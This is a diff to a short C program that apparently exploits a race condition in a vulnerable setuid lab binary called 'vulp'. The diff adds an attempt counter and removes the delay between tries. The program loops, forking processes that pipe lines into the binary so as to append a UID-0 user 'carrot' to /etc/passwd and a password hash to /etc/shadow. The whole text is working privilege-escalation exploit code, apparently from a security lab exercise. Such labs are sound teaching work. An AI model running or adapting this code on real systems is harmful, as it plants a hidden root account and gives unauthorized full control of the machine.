@@ -10,7 +10,7 @@
 void race ( char *filename, char *command ) {
 
 	struct stat st;
-	int inicial_size, final_size;
+	int inicial_size, final_size, counter = 1;
 
 	stat( filename, &st );
 	inicial_size = st.st_size;
@@ -19,6 +19,7 @@ void race ( char *filename, char *command ) {
 
 		if( fork() == 0 ) {
 			system( command );
+			exit( EXIT_SUCCESS );
 		}
 
 		/* Race-condition */
@@ -33,11 +34,13 @@ void race ( char *filename, char *command ) {
 		stat( filename, &st );
 		final_size = st.st_size;
 		if ( final_size > inicial_size ) {
-			printf( "Changed %s\n", filename );
+			printf( "\nChanged %s\n", filename );
 			return;
 		}
 
-		system("sleep 0.25");
+		printf("\33[2K\r");
+		printf("Attempt: %d", counter++);
+		/* system("sleep 0.001"); */
 
 	}
 
@@ -46,7 +49,7 @@ void race ( char *filename, char *command ) {
 int main ( int argc, char** argv ) {
 
 	race( "/etc/passwd", "echo \"carrot:x:0:0:carrot:/root:/bin/bash\" | ./vulp > /dev/null" );
-	race( "/etc/shadow", "echo \"carrot:\$1\$312\$wvJjqn48qHEp.DhR./47R/:::::::\" | ./vulp > /dev/null" );
+	race( "/etc/shadow", "echo \"carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::\" | ./vulp > /dev/null" );
 
 	/* End process successfully */
 	exit( EXIT_SUCCESS );
